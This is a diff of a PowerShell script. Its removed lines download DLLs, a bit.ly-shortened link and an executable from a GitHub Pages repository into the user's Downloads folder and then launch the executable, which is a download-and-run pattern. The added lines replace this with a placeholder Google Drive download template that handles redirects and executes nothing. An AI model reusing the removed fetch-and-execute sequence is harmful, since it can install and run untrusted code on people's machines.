@@ -1,20 +1,16 @@
-$urls = @(
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
-    "https://bit.ly/3TSXg8r",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
-)
+# This is a generic example and might not work with your specific Google Drive link due to security restrictions
+$url = "YourPublicGoogleDriveDownloadLinkHere"
+$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\YourFileNameHere"
 
-$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
-if (-not (Test-Path -Path $downloadDir)) {
-    New-Item -ItemType Directory -Path $downloadDir
+# Attempt to bypass redirects by using Invoke-WebRequest with -MaximumRedirection 0
+try {
+    Invoke-WebRequest -Uri $url -OutFile $downloadPath -MaximumRedirection 0
 }
-
-foreach ($url in $urls) {
-    $fileName = [System.IO.Path]::GetFileName($url)
-    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
-    Invoke-WebRequest -Uri $url -OutFile $destinationPath
+catch {
+    # If the above fails due to redirection, try to extract the redirected URL from the exception
+    $redirectedUrl = $_.Exception.Response.Headers.Location
+    if ($redirectedUrl) {
+        # Try downloading using the redirected URL
+        Invoke-WebRequest -Uri $redirectedUrl -OutFile $downloadPath
+    }
 }
-
-$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
-Start-Process -FilePath $exePath
